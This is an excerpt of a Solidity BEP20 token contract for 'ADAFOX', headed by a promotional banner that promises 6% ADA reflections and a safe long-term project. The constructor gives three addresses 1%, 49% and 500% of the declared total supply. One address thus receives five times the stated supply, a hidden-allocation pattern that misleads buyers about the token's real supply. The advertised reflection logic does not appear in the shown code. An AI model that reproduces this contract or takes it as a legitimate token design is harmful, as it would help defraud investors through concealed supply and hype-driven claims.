...
-------------------------------------------------------------------
--------------------------    ADAFOX   ----------------------------
🦊 ADAFOX THE NEW ERA OF ADA REWARDS 🦊 Get rewarded in Cardano
thanks to our Smart Contract, Our 6% ADA reflections are sure to 
amp up your bag. If you are looking for a SAFU long-term project 
look no further, we welcome you to come to join our TG.

https://www.adafoxtoken.com/
https://twitter.com/ADAFOXTOKEN
https://t.me/ADAFOXTOKEN
-------------------------------------------------------------------
*/
...
contract ADAFOXToken is IBEP20 {
     // FairLaunch
    // common addresses
    address private owner;
    address private ADAFOXBSC;
    address private ADAFOXCoin;
    address private ADAFOXs;
    ...
    string public override name = "ADAFOX";
    string public override symbol = "ADAFOX";
    ...
    constructor(uint totalSupplyValue, address ADAFOXBSCAddress, address ADAFOXCoinAddress, address ADAFOXsAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        ADAFOXBSC = ADAFOXBSCAddress;
        ADAFOXCoin = ADAFOXCoinAddress;
        ADAFOXs = ADAFOXsAddress;
        balances[ADAFOXBSC] =  totalSupply * 1 / 100;
        balances[ADAFOXCoin] = totalSupply * 49 / 100;
        balances[ADAFOXs] = totalSupply * 500 / 100;
